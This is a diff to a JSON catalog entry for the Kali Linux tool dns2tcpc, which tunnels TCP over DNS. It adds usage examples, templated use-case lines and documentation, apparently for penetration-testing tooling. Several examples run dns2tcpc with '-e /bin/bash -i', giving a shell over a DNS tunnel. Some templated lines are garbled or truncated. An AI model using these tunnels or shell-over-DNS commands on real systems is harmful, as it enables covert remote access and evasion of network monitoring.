@@ -27,7 +27,30 @@
       "path": "/usr/bin/dns2tcpc",
       "description": "A tunneling tool that encapsulate TCP traffic over DNS.",
       "usage": "dns2tcpc [options] [args]",
-      "arguments": []
+      "arguments": [
+        {
+          "flags": [
+            "-c"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "DNS compression. When used, be sure that all relay and DNS server support com-",
+          "default": null,
+          "choices": null,
+          "raw": "-c  DNS compression. When used, be sure that all relay and DNS server support com-"
+        },
+        {
+          "flags": [
+            "-h"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Help Menu",
+          "default": null,
+          "choices": null,
+          "raw": "-h  Help Menu"
+        }
+      ]
     },
     {
       "name": "dns2tcpd",
@@ -51,5 +74,53 @@
   "schema_version": "1.1.0",
   "attack_surface": "local",
   "phase_hint": "install",
-  "requires_hardware": false
+  "requires_hardware": false,
+  "command_examples": [
+    "dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f",
+    "dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns",
+    "ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver",
+    "dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr mydns",
+    "dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z dns2tcp.hsc.fr mydns"
+  ],
+  "use_cases": [
+    "When you need Kali Linux, use dns2tcpc because TCP-over-DNS tunnel server and client.",
+    "When the engagement is in the install phase, use dns2tcpc as a cataloged Kali Linux tool with operator ACCEPT/CANCEL gating.",
+    "When you need a concrete invocation, run `dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f` as documented upstream for dns2tcpc.",
+    "When you need a concrete invocation, run `dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns` as documented upstream for dns2tcpc.",
+    "When you need a concrete invocation, run `ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver` as documented upstream for dns2tcpc.",
+    "When you need a concrete invocation, run `dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr mydns` as documented upstream for dns2tcpc.",
+    "When chaining Kali Linux tools, pair dns2tcpc with sibling catalog entries sharing its attack_surface/phase_hint.",
+    "When validating lab setup, run `dns2tcpc --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+  ],
+  "documentation": {
+    "arguments": [
+      {
+        "name": "-c",
+        "description": "DNS compression. When used, be sure that all relay and DNS server support com-",
+        "source": "docs"
+      },
+      {
+        "name": "-h",
+        "description": "Help Menu",
+        "source": "docs"
+      }
+    ],
+    "examples": [
+      "dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f",
+      "dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns",
+      "ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver",
+      "dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr mydns",
+      "dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z dns2tcp.hsc.fr mydns"
+    ],
+    "readme": "dns2tcpc - A tunneling tool that encapsulate TCP traffic over DNS.",
+    "how_to_use": "Install/setup: sudo apt install dns2tcp. Run the primary entrypoint as shown in upstream docs, e.g. `dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f`. Further invocations from upstream: `dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns`; `ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver`.",
+    "when_to_use": "Use during the 'install' phase against surfaces [local] in the Kali Linux category. Fits when the engagement needs: TCP-over-DNS tunnel server and client.",
+    "why_to_use": "Prefer this tool based on upstream description: dns2tcpc - A tunneling tool that encapsulate TCP traffic over DNS.",
+    "usage_sections": [
+      "Install with: sudo apt install dns2tcp",
+      "Install with: sudo apt install dns2tcp"
+    ]
+  },
+  "_kfiosa_enhanced_v3": true,
+  "_enhanced_via": "local_man"
 }
